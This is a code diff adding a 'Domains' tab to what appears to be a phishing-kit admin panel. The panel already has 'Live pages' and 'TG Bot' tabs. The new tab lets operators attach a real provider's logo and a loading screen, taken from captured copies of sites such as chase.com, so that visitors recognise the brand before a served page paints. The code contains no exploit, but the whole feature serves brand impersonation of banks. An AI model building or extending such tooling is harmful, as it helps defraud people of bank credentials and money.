@@ -8011,6 +8011,10 @@
                     <svg viewBox="0 0 24 24"><path d="M9 2v6h6V2h-6zm8 0v6h5V2h-5zM2 2v6h6V2H2zm7 8v6h6v-6H9zm8 0v6h5v-6h-5zM2 10v6h6v-6H2zm7 8v4h6v-4H9zm8 0v4h5v-4h-5zM2 18v4h6v-4H2z"/></svg>
                     <span>Live pages</span>
                 </button>
+                <button class="top-tab" data-tab="domains">
+                    <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm6.93 6h-2.95a15.6 15.6 0 00-1.38-3.56A8.03 8.03 0 0118.93 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82A15.6 15.6 0 0112 4.04zM4.26 14a8.2 8.2 0 010-4h3.38a16.5 16.5 0 000 4H4.26zm.81 2h2.95c.32 1.25.78 2.45 1.38 3.56A8.03 8.03 0 015.07 16zm2.95-8H5.07a8.03 8.03 0 014.33-3.56A15.6 15.6 0 008.02 8zM12 19.96a15.6 15.6 0 01-1.91-3.96h3.82A15.6 15.6 0 0112 19.96zM14.34 14H9.66a14.7 14.7 0 010-4h4.68a14.7 14.7 0 010 4zm.26 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 01-4.33 3.56zM16.36 14a16.5 16.5 0 000-4h3.38a8.2 8.2 0 010 4h-3.38z"/></svg>
+                    <span>Domains</span>
+                </button>
                 <button class="top-tab" data-tab="tgbot">
                     <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
                     <span>TG Bot</span>
@@ -9085,6 +9089,145 @@
                 </div>
             </div>
 
+            <div class="tab-content" id="domains-content">
+                <style>
+                    #domains-content { padding: 4px 2px 40px; }
+                    #domains-content .dm-head { display:flex; align-items:flex-start; gap:12px; margin: 2px 0 18px; }
+                    #domains-content .dm-head h2 { margin:0 0 4px; font-size:19px; letter-spacing:.2px; }
+                    #domains-content .dm-head p { margin:0; font-size:13px; line-height:1.5; opacity:.72; max-width: 760px; }
+                    #domains-content .dm-grid { display:grid; grid-template-columns: minmax(320px, 420px) 1fr; gap:18px; align-items:start; }
+                    @media (max-width: 980px) { #domains-content .dm-grid { grid-template-columns: 1fr; } }
+                    #domains-content .dm-card { border:1px solid rgba(255,255,255,0.09); background:rgba(255,255,255,0.028);
+                        border-radius:16px; padding:16px 16px 14px; }
+                    #domains-content .dm-card h3 { margin:0 0 12px; font-size:14px; letter-spacing:.3px; text-transform:uppercase; opacity:.75; }
+                    #domains-content .dm-row { margin-bottom:12px; }
+                    #domains-content .dm-row > label { display:block; font-size:12px; margin-bottom:5px; opacity:.72; letter-spacing:.2px; }
+                    #domains-content input[type=text], #domains-content select, #domains-content textarea {
+                        width:100%; box-sizing:border-box; padding:10px 11px; font-size:13.5px; color:#eef1f7;
+                        background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12);
+                        border-radius:10px; outline:none; font-family:inherit; }
+                    #domains-content input[type=text]:focus, #domains-content select:focus, #domains-content textarea:focus {
+                        border-color:rgba(122,162,255,0.55); background:rgba(255,255,255,0.07); }
+                    #domains-content textarea { min-height:92px; resize:vertical; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:12px; }
+                    #domains-content .dm-hint { font-size:11.5px; opacity:.55; margin-top:5px; line-height:1.45; }
+                    #domains-content .dm-split { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+                    @media (max-width: 520px) { #domains-content .dm-split { grid-template-columns:1fr; } }
+                    #domains-content .dm-actions { display:flex; gap:9px; flex-wrap:wrap; margin-top:14px; }
+                    #domains-content .dm-btn { border:1px solid rgba(255,255,255,0.14); background:rgba(255,255,255,0.06);
+                        color:#eef1f7; padding:9px 15px; border-radius:10px; font-size:13px; cursor:pointer; font-family:inherit; }
+                    #domains-content .dm-btn:hover { background:rgba(255,255,255,0.1); }
+                    #domains-content .dm-btn.primary { background:#4a90d9; border-color:#4a90d9; color:#fff; font-weight:600; }
+                    #domains-content .dm-btn.primary:hover { background:#3f81c4; }
+                    #domains-content .dm-btn.danger { border-color:rgba(255,110,110,0.4); color:#ff9b9b; }
+                    #domains-content .dm-logo-preview { width:52px; height:52px; border-radius:12px; object-fit:contain;
+                        background:#fff; padding:5px; box-sizing:border-box; border:1px solid rgba(255,255,255,0.14); }
+                    #domains-content .dm-logo-row { display:flex; align-items:center; gap:10px; }
+                    #domains-content .dm-logo-row input { flex:1; }
+                    #domains-content .dm-list { display:flex; flex-direction:column; gap:10px; }
+                    #domains-content .dm-item { display:flex; align-items:center; gap:13px; padding:12px 13px;
+                        border:1px solid rgba(255,255,255,0.09); border-radius:14px; background:rgba(255,255,255,0.025); }
+                    #domains-content .dm-item.off { opacity:.55; }
+                    #domains-content .dm-item img { width:38px; height:38px; border-radius:10px; object-fit:contain; background:#fff; padding:4px; box-sizing:border-box; flex:none; }
+                    #domains-content .dm-item .dm-meta { min-width:0; flex:1; }
+                    #domains-content .dm-item .dm-domain { font-size:14px; font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+                    #domains-content .dm-item .dm-sub { font-size:11.5px; opacity:.6; margin-top:2px; }
+                    #domains-content .dm-pill { display:inline-block; font-size:10.5px; letter-spacing:.4px; text-transform:uppercase;
+                        padding:3px 8px; border-radius:99px; background:rgba(122,162,255,0.16); color:#b9cdff; margin-left:6px; }
+                    #domains-content .dm-item .dm-item-actions { display:flex; gap:7px; flex:none; }
+                    #domains-content .dm-empty { font-size:13px; opacity:.6; padding:18px 4px; }
+                    #domains-content .dm-switch { display:flex; align-items:center; gap:8px; font-size:13px; }
+                    #domains-content .dm-note { font-size:12.5px; opacity:.75; margin-top:10px; min-height:16px; }
+                    #domains-content .dm-note.ok { color:#7ee2a8; }
+                    #domains-content .dm-note.err { color:#ff9b9b; }
+                </style>
+
+                <div class="dm-head">
+                    <div>
+                        <h2>Domains</h2>
+                        <p>The loading screen a site's visitors see, and the provider's logo they recognise.
+                           Configure a domain once and every page captured from it uses it — instead of the generic loader.</p>
+                    </div>
+                </div>
+
+                <div class="dm-grid">
+                    <div class="dm-card">
+                        <h3 id="dm-form-title">Add a domain</h3>
+
+                        <div class="dm-row">
+                            <label>Domain</label>
+                            <input type="text" id="dm-domain" placeholder="chase.com" autocomplete="off" spellcheck="false">
+                            <div class="dm-hint">A full link is fine too — <code>https://www.chase.com/login</code> is stored as <code>chase.com</code>, and its subdomains match.</div>
+                        </div>
+
+                        <div class="dm-row dm-split">
+                            <div>
+                                <label>Name shown under the logo</label>
+                                <input type="text" id="dm-label" placeholder="Chase" autocomplete="off">
+                            </div>
+                            <div>
+                                <label>Take it from an archived page</label>
+                                <select id="dm-page-pick"><option value="">— pick a page —</option></select>
+                            </div>
+                        </div>
+
+                        <div class="dm-row">
+                            <label>Provider logo</label>
+                            <div class="dm-logo-row">
+                                <img id="dm-logo-preview" class="dm-logo-preview" alt="" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23bbb' d='M4 4h16v16H4z'/%3E%3C/svg%3E">
+                                <input type="text" id="dm-logo" placeholder="https://…/apple-touch-icon.png" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="dm-hint">Leave it empty and “Use this page” fills in the best icon the capture carries —
+                                a 180px touch icon stays sharp at the size the loading screen draws (a 16px favicon does not).</div>
+                        </div>
+
+                        <div class="dm-row">
+                            <label>Loading screen</label>
+                            <select id="dm-spinner-kind">
+                                <option value="logo">Logo + progress bar (built in)</option>
+                                <option value="html">My own HTML file</option>
+                                <option value="page">An archived page</option>
+                            </select>
+                        </div>
+
+                        <div class="dm-row" id="dm-html-row" style="display:none;">
+                            <label>HTML file</label>
+                            <input type="file" id="dm-html-file" accept=".html,.htm,text/html" style="font-size:12.5px;">
+                            <textarea id="dm-html" placeholder="…or paste the HTML here" spellcheck="false"></textarea>
+                            <div class="dm-hint">Up to 1 MB. Scripts run inside their own frame, so the file behaves as it would in a browser.</div>
+                        </div>
+
+                        <div class="dm-row" id="dm-page-row" style="display:none;">
+                            <label>Archived page used as the loader</label>
+                            <select id="dm-spinner-page"><option value="">— pick a page —</option></select>
+                        </div>
+
+                        <div class="dm-row">
+                            <label class="dm-switch">
+                                <input type="checkbox" id="dm-enabled" checked style="accent-color:#4a90d9">
+                                <span>Use this loading screen for the domain</span>
+                            </label>
+                        </div>
+
+                        <div class="dm-actions">
+                            <button class="dm-btn primary" id="dm-save">Save domain</button>
+                            <button class="dm-btn" id="dm-reset">New / clear</button>
+                        </div>
+                        <div class="dm-note" id="dm-note"></div>
+                    </div>
+
+                    <div class="dm-card">
+                        <h3>Configured domains</h3>
+                        <div class="dm-list" id="dm-list">
+                            <div class="dm-empty">Nothing configured yet. Add a domain on the left.</div>
+                        </div>
+                        <div class="dm-hint">
+                            The visitor sees this before the page paints — the server puts it inside the page it serves,
+                            so there is no blank moment and no second spinner when a workflow starts.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
             <div class="tab-content" id="lpv-content">
                 <div class="lpv-header">
                     <div class="lpv-title">
@@ -10064,6 +10207,317 @@
             }
         }
 
+        /* ============================================================
+           DOMAINS  — per-site loading screens
+           ============================================================
+           One configuration per host: the provider's logo (shown while the
+           page loads) and, optionally, the loading page that site shows.
+
+           The server puts the resolved page INSIDE the document it serves to
+           the visitor, so it is painted as the browser parses it — no blank
+           moment, and no second copy when a workflow starts. `spinner_kind`
+           is only a hint for this form; what is stored is
+           `spinner_html` (an uploaded/pasted file) or `spinner_page_id`
+           (an archived page). With neither, the logo + progress bar the
+           server builds is used.
+           ============================================================ */
+        const DOMAINS = { items: [], pages: [], editing: null, html: '' };
+
+        function dmEl(id) { return document.getElementById(id); }
+        function dmNote(text, kind) {
+            const el = dmEl('dm-note');
+            if (!el) return;
+            el.textContent = text || '';
+            el.className = 'dm-note' + (kind ? ' ' + kind : '');
+        }
+
+        async function domainsLoadPages() {
+            try {
+                const r = await serverFetch('/api/lpv/archive?limit=200');
+                const data = await r.json();
+                DOMAINS.pages = Array.isArray(data.pages) ? data.pages : [];
+            } catch (e) {
+                DOMAINS.pages = [];
+            }
+            const opts = ['<option value="">— pick a page —</option>']
+                .concat(DOMAINS.pages.map((p) =>
+                    '<option value="' + String(p.id).replace(/"/g, '&quot;') + '">' +
+                    String(p.name || p.id).replace(/</g, '&lt;') + '</option>'));
+            ['dm-page-pick', 'dm-spinner-page'].forEach((id) => {
+                const el = dmEl(id);
+                if (el) el.innerHTML = opts.join('');
+            });
+        }
+
+        function domainsSpinnerKind(item) {
+            if (!item) return 'logo';
+            if (item.has_spinner_html) return 'html';
+            if (item.spinner_page_id) return 'page';
+            return 'logo';
+        }
+
+        function domainsSyncKindRows() {
+            const kind = (dmEl('dm-spinner-kind') || {}).value || 'logo';
+            const htmlRow = dmEl('dm-html-row');
+            const pageRow = dmEl('dm-page-row');
+            if (htmlRow) htmlRow.style.display = kind === 'html' ? '' : 'none';
+            if (pageRow) pageRow.style.display = kind === 'page' ? '' : 'none';
+        }
+
+        function domainsSyncLogoPreview() {
+            const img = dmEl('dm-logo-preview');
+            const input = dmEl('dm-logo');
+            if (!img) return;
+            const url = ((input && input.value) || '').trim();
+            img.src = url || "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23bbb' d='M4 4h16v16H4z'/%3E%3C/svg%3E";
+        }
+
+        function domainsRender() {
+            const list = dmEl('dm-list');
+            if (!list) return;
+            if (!DOMAINS.items.length) {
+                list.innerHTML = '<div class="dm-empty">Nothing configured yet. Add a domain on the left.</div>';
+                return;
+            }
+            list.innerHTML = DOMAINS.items.map((item) => {
+                const kind = domainsSpinnerKind(item);
+                const badge = kind === 'html' ? 'own html' : (kind === 'page' ? 'archived page' : 'logo');
+                const domain = String(item.domain || '');
+                const logo = (item.logo_url || '')
+                    ? '<img src="' + String(item.logo_url).replace(/"/g, '&quot;') + '" alt="">'
+                    : '<div style="width:38px;height:38px;border-radius:10px;background:rgba(255,255,255,0.08);flex:none;"></div>';
+                return '' +
+                    '<div class="dm-item' + (item.enabled ? '' : ' off') + '">' +
+                        logo +
+                        '<div class="dm-meta">' +
+                            '<div class="dm-domain">' + domain.replace(/</g, '&lt;') +
+                                '<span class="dm-pill">' + badge + '</span>' +
+                                (item.enabled ? '' : '<span class="dm-pill" style="background:rgba(255,255,255,0.1);color:#c9cfe0;">off</span>') +
+                            '</div>' +
+                            '<div class="dm-sub">' + String(item.label || 'no name').replace(/</g, '&lt;') + '</div>' +
+                        '</div>' +
+                        '<div class="dm-item-actions">' +
+                            '<button class="dm-btn" data-dm-edit="' + domain.replace(/"/g, '&quot;') + '">Edit</button>' +
+                            '<button class="dm-btn" data-dm-toggle="' + domain.replace(/"/g, '&quot;') + '">' +
+                                (item.enabled ? 'Turn off' : 'Turn on') + '</button>' +
+                            '<button class="dm-btn danger" data-dm-del="' + domain.replace(/"/g, '&quot;') + '">Delete</button>' +
+                        '</div>' +
+                    '</div>';
+            }).join('');
+
+            list.querySelectorAll('[data-dm-edit]').forEach((btn) => {
+                btn.addEventListener('click', () => domainsEdit(btn.getAttribute('data-dm-edit')));
+            });
+            list.querySelectorAll('[data-dm-toggle]').forEach((btn) => {
+                btn.addEventListener('click', () => domainsToggle(btn.getAttribute('data-dm-toggle')));
+            });
+            list.querySelectorAll('[data-dm-del]').forEach((btn) => {
+                btn.addEventListener('click', () => domainsDelete(btn.getAttribute('data-dm-del')));
+            });
+        }
+
+        async function domainsLoad() {
+            try {
+                const r = await serverFetch('/api/lpv/domains');
+                const data = await r.json();
+                DOMAINS.items = Array.isArray(data.domains) ? data.domains : [];
+            } catch (e) {
+                DOMAINS.items = [];
+                dmNote('Could not reach the server for the domain list.', 'err');
+            }
+            domainsRender();
+            await domainsLoadPages();
+        }
+
+        function domainsReset() {
+            DOMAINS.editing = null;
+            DOMAINS.html = '';
+            const set = (id, value) => { const el = dmEl(id); if (el) el.value = value; };
+            set('dm-domain', '');
+            set('dm-label', '');
+            set('dm-logo', '');
+            set('dm-spinner-kind', 'logo');
+            set('dm-spinner-page', '');
+            set('dm-html', '');
+            const file = dmEl('dm-html-file');
+            if (file) file.value = '';
+            const enabled = dmEl('dm-enabled');
+            if (enabled) enabled.checked = true;
+            const pick = dmEl('dm-page-pick');
+            if (pick) pick.value = '';
+            const title = dmEl('dm-form-title');
+            if (title) title.textContent = 'Add a domain';
+            domainsSyncKindRows();
+            domainsSyncLogoPreview();
+            dmNote('');
+        }
+
+        async function domainsEdit(domain) {
+            const item = DOMAINS.items.find((d) => d.domain === domain);
+            if (!item) return;
+            DOMAINS.editing = domain;
+            const set = (id, value) => { const el = dmEl(id); if (el) el.value = value; };
+            set('dm-domain', item.domain || '');
+            set('dm-label', item.label || '');
+            set('dm-logo', item.logo_url || '');
+            set('dm-spinner-kind', domainsSpinnerKind(item));
+            set('dm-spinner-page', item.spinner_page_id || '');
+            set('dm-html', '');
+            const enabled = dmEl('dm-enabled');
+            if (enabled) enabled.checked = !!item.enabled;
+            const title = dmEl('dm-form-title');
+            if (title) title.textContent = 'Edit ' + item.domain;
+            domainsSyncKindRows();
+            domainsSyncLogoPreview();
+            // The list never ships the HTML itself (it can be 1 MB), so fetch
+            // the resolved document for editing only when there is one.
+            if (item.has_spinner_html) {
+                try {
+                    const r = await serverFetch('/api/lpv/domains/' + encodeURIComponent(item.domain) + '/spinner.html');
+                    if (r.ok) {
+                        const text = await r.text();
+                        const box = dmEl('dm-html');
+                        if (box) box.value = text;
+                        DOMAINS.html = text;
+                    }
+                } catch (e) { /* the form still saves what is typed */ }
+            }
+            dmNote('Editing ' + item.domain + ' — saving replaces it.');
+        }
+
+        async function domainsFillFromPage() {
+            const pick = dmEl('dm-page-pick');
+            const pageId = pick && pick.value;
+            if (!pageId) { dmNote('Pick an archived page first.', 'err'); return; }
+            try {
+                const r = await serverFetch('/api/lpv/pages/' + encodeURIComponent(pageId) + '/logo');
+                const data = await r.json();
+                if (!r.ok) throw new Error(data.error || 'lookup failed');
+                const domainEl = dmEl('dm-domain');
+                if (domainEl && data.domain) domainEl.value = data.domain;
+                const best = (data.candidates || [])[0];
+                const logoEl = dmEl('dm-logo');
+                if (logoEl && best && !logoEl.value) logoEl.value = best.url;
+                const labelEl = dmEl('dm-label');
+                if (labelEl && !labelEl.value && data.domain) {
+                    labelEl.value = data.domain.split('.')[0].replace(/^www$/, '');
+                }
+                domainsSyncLogoPreview();
+                dmNote(best
+                    ? 'Filled from the capture: ' + data.domain + ' (logo: ' + (best.kind || 'icon') + ').'
+                    : 'Filled the domain (' + (data.domain || 'unknown') + '); no logo found in that capture — paste one.',
+                    best ? 'ok' : '');
+            } catch (e) {
+                dmNote('Could not read that page: ' + (e && e.message ? e.message : e), 'err');
+            }
+        }
+
+        function domainsReadFile(file) {
+            if (!file) return;
+            if (file.size > 1024 * 1024) {
+                dmNote('That file is larger than 1 MB.', 'err');
+                return;
+            }
+            const reader = new FileReader();
+            reader.onload = () => {
+                const text = String(reader.result || '');
+                DOMAINS.html = text;
+                const box = dmEl('dm-html');
+                if (box) box.value = text;
+                dmNote('Loaded ' + file.name + ' (' + Math.round(text.length / 1024) + ' KB).', 'ok');
+            };
+            reader.onerror = () => dmNote('Could not read that file.', 'err');
+            reader.readAsText(file);
+        }
+
+        async function domainsSave() {
+            const domain = ((dmEl('dm-domain') || {}).value || '').trim();
+            if (!domain) { dmNote('Type the domain first (for example chase.com).', 'err'); return; }
+            const kind = (dmEl('dm-spinner-kind') || {}).value || 'logo';
+            const payload = {
+                domain: domain,
+                label: ((dmEl('dm-label') || {}).value || '').trim(),
+                logo_url: ((dmEl('dm-logo') || {}).value || '').trim(),
+                enabled: !!(dmEl('dm-enabled') || {}).checked,
+                spinner_html: '',
+                spinner_page_id: '',
+            };
+            if (kind === 'html') {
+                const html = ((dmEl('dm-html') || {}).value || '');
+                if (!html.trim()) { dmNote('Choose an HTML file (or paste it) first.', 'err'); return; }
+                payload.spinner_html = html;
+            } else if (kind === 'page') {
+                const pid = (dmEl('dm-spinner-page') || {}).value || '';
+                if (!pid) { dmNote('Pick the archived page to use as the loader.', 'err'); return; }
+                payload.spinner_page_id = pid;
+            }
+            const btn = dmEl('dm-save');
+            if (btn) btn.disabled = true;
+            try {
+                const r = await serverFetch('/api/lpv/domains', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                const data = await r.json().catch(() => ({}));
+                if (!r.ok) throw new Error(data.error || ('save failed (' + r.status + ')'));
+                dmNote('Saved ' + (data.domain && data.domain.domain ? data.domain.domain : domain) + '.', 'ok');
+                await domainsLoad();
+                domainsReset();
+            } catch (e) {
+                dmNote(String(e && e.message ? e.message : e), 'err');
+            } finally {
+                if (btn) btn.disabled = false;
+            }
+        }
+
+        async function domainsDelete(domain) {
+            if (!confirm('Delete the loading screen for ' + domain + '?')) return;
+            try {
+                const r = await serverFetch('/api/lpv/domains/' + encodeURIComponent(domain), { method: 'DELETE' });
+                if (!r.ok) throw new Error('delete failed (' + r.status + ')');
+                dmNote('Deleted ' + domain + '.', 'ok');
+                if (DOMAINS.editing === domain) domainsReset();
+                await domainsLoad();
+            } catch (e) {
+                dmNote(String(e && e.message ? e.message : e), 'err');
+            }
+        }
+
+        async function domainsToggle(domain) {
+            const item = DOMAINS.items.find((d) => d.domain === domain);
+            if (!item) return;
+            try {
+                const r = await serverFetch('/api/lpv/domains', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ domain: domain, enabled: !item.enabled }),
+                });
+                if (!r.ok) throw new Error('could not change it (' + r.status + ')');
+                await domainsLoad();
+                dmNote((item.enabled ? 'Turned off ' : 'Turned on ') + domain + '.', 'ok');
+            } catch (e) {
+                dmNote(String(e && e.message ? e.message : e), 'err');
+            }
+        }
+
+        function domainsWire() {
+            if (DOMAINS.wired) return;
+            DOMAINS.wired = true;
+            const on = (id, ev, fn) => {
+                const el = dmEl(id);
+                if (el) el.addEventListener(ev, fn);
+            };
+            on('dm-save', 'click', domainsSave);
+            on('dm-reset', 'click', domainsReset);
+            on('dm-spinner-kind', 'change', domainsSyncKindRows);
+            on('dm-logo', 'input', domainsSyncLogoPreview);
+            on('dm-page-pick', 'change', domainsFillFromPage);
+            on('dm-html-file', 'change', (e) => domainsReadFile(e.target && e.target.files && e.target.files[0]));
+            domainsSyncKindRows();
+            domainsSyncLogoPreview();
+        }
+
         // Manager WebSocket for System Stats
         let managerWs = null;
         let managerReconnectAttempts = 0;
@@ -10438,6 +10892,11 @@
 
             if (tabId === 'links') {
                 loadLinks();
+            }
+
+            if (tabId === 'domains') {
+                domainsWire();
+                domainsLoad();
             }
 
             // Close monitor panel when switching tabs
